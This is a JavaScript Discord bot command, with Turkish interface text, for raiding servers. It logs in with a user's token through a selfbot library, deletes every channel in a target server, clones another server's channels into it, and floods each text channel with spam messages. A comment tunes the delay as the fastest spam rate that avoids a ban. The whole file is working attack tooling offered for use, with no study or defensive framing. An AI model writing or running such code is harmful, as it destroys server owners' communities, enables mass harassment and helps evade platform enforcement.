const { 
    SlashCommandBuilder, 
    EmbedBuilder, 
    ActionRowBuilder, 
    ButtonBuilder, 
    ButtonStyle, 
    ModalBuilder, 
    TextInputBuilder, 
    TextInputStyle,
    InteractionType 
} = require('discord.js');
const { Client: SelfClient } = require('discord.js-selfbot-v13');

module.exports = {
    data: new SlashCommandBuilder()
        .setName('spam')
        .setDescription('Sunucuyu kopyalar ve kanallara seri mesaj gönderir.'),

    async execute(interaction) {
        // 1. ARAYÜZ PANELİ
        const embed = new EmbedBuilder()
            .setColor('#000000')
            .setTitle('☣️ Aethelgard Ultimate Spam')
            .setDescription('**Yıkım ve Klonlama Sistemi**\n\nİşlemi başlatmak için aşağıdaki butona tıkla.')
            .setFooter({ text: 'discord.gg/base64 • 2026' });

        const row = new ActionRowBuilder().addComponents(
            new ButtonBuilder()
                .setCustomId('ultimate_spam_btn')
                .setLabel('.gg/json')
                .setStyle(ButtonStyle.Danger)
        );

        const response = await interaction.reply({ embeds: [embed], components: [row], ephemeral: true });

        // 2. BUTON DİNLEYİCİ
        const collector = response.createMessageComponentCollector({ time: 600000 });

        collector.on('collect', async i => {
            if (i.customId === 'ultimate_spam_btn') {
                const modal = new ModalBuilder()
                    .setCustomId('ultimate_modal')
                    .setTitle('Spam & Klon Verileri');

                modal.addComponents(
                    new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('tk').setLabel('Self Token').setStyle(TextInputStyle.Short).setRequired(true)),
                    new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('sid').setLabel('Kaynak Sunucu ID').setStyle(TextInputStyle.Short).setRequired(true)),
                    new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('tid').setLabel('Hedef Sunucu ID').setStyle(TextInputStyle.Short).setRequired(true)),
                    new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('msg').setLabel('Spam Mesajı').setStyle(TextInputStyle.Paragraph).setRequired(true)),
                    new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('cnt').setLabel('Kanal Başı Mesaj Sayısı').setStyle(TextInputStyle.Short).setRequired(true))
                );
                await i.showModal(modal);
            }
        });

        // 3. MODAL SUBMIT (TÜM SİSTEM)
        const modalListener = async (mInt) => {
            if (mInt.type !== InteractionType.ModalSubmit || mInt.customId !== 'ultimate_modal') return;
            
            // Listener'ı temizle ki her kullanımda birikmesin
            interaction.client.removeListener('interactionCreate', modalListener);

            const [token, sId, tId, spamMsg, count] = ['tk', 'sid', 'tid', 'msg', 'cnt'].map(id => mInt.fields.getTextInputValue(id));
            const msgCount = parseInt(count) || 10;

            await mInt.reply({ content: '☣️ **Saldırı Başladı.** Kanallar kopyalanıyor ve spamlanıyor...', ephemeral: true });

            const self = new SelfClient({ checkUpdate: false });

            self.on('ready', async () => {
                try {
                    const source = self.guilds.cache.get(sId);
                    const target = self.guilds.cache.get(tId);

                    if (!source || !target) return mInt.followUp({ content: '❌ Sunucu bulunamadı!', ephemeral: true });

                    // ESKİ KANALLARI SİL
                    const tChannels = await target.channels.fetch();
                    for (const c of tChannels.values()) await c.delete().catch(() => {});

                    // KANALLARI AÇ VE DURMADAN MESAJ AT
                    const sChannels = await source.channels.fetch();
                    const categories = sChannels.filter(c => c.type === 'GUILD_CATEGORY').sort((a,b) => a.position - b.position);

                    for (const cat of categories.values()) {
                        const newCat = await target.channels.create(cat.name, { type: 'GUILD_CATEGORY' });
                        const children = sChannels.filter(c => c.parentId === cat.id).sort((a,b) => a.position - b.position);

                        for (const child of children.values()) {
                            const newChan = await target.channels.create(child.name, { type: child.type, parent: newCat.id });

                            if (newChan.type === 'GUILD_TEXT') {
                                // SPAM DÖNGÜSÜ
                                for (let j = 0; j < msgCount; j++) {
                                    await newChan.send(spamMsg).catch(() => {});
                                    // 400ms bekleme: Ban yemeden en hızlı spam hızı
                                    await new Promise(r => setTimeout(r, 400));
                                }
                            }
                            await new Promise(r => setTimeout(r, 1000));
                        }
                    }
                    await mInt.followUp({ content: '✅ İşlem tamamlandı.', ephemeral: true });
                    self.destroy();
                } catch (err) {
                    console.error(err);
                    self.destroy();
                }
            });

            self.login(token).catch(() => mInt.followUp({ content: '❌ Hatalı Token!', ephemeral: true }));
        };

        interaction.client.on('interactionCreate', modalListener);
    },
};
